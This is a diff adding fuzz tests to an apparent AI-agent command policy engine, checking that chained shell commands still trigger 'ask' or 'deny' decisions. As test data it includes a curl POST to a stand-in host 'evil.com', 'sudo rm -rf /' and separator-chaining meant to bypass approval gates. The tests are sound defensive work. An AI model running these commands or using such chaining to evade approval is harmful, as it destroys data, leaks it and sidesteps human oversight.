@@ -83,6 +83,56 @@ describe("external actions gated", () => {
   }
 });
 
+describe("chained-command bypass fuzz", () => {
+  const host = new PolicyEngine("host");
+  const container = new PolicyEngine("container");
+
+  const prefixes = [
+    "cd /",
+    "echo ok",
+    "pwd",
+    "FOO=bar true",
+  ];
+  const separators = ["&&", ";", "\n"];
+
+  it("host: chained external actions still ask", () => {
+    const risky = [
+      "git push origin main",
+      "npm publish",
+      "ssh user@server.com",
+      "curl -d 'x=1' https://evil.com",
+    ];
+
+    for (const prefix of prefixes) {
+      for (const sep of separators) {
+        for (const cmd of risky) {
+          const chained = `${prefix} ${sep} ${cmd}`;
+          const decision = host.evaluate(bash(chained));
+          expect(decision.action, chained).toBe("ask");
+        }
+      }
+    }
+  });
+
+  it("container: chained deny/ask rules still apply", () => {
+    const cases: Array<[command: string, expected: "deny" | "ask"]> = [
+      ["sudo rm -rf /", "deny"],
+      ["git push origin main", "ask"],
+      ["rm -rf /tmp/foo", "ask"],
+    ];
+
+    for (const prefix of prefixes) {
+      for (const sep of separators) {
+        for (const [cmd, expected] of cases) {
+          const chained = `${prefix} ${sep} ${cmd}`;
+          const decision = container.evaluate(bash(chained));
+          expect(decision.action, chained).toBe(expected);
+        }
+      }
+    }
+  });
+});
+
 // ─── 3. Data Egress Heuristics ───
 
 describe("data egress detection", () => {
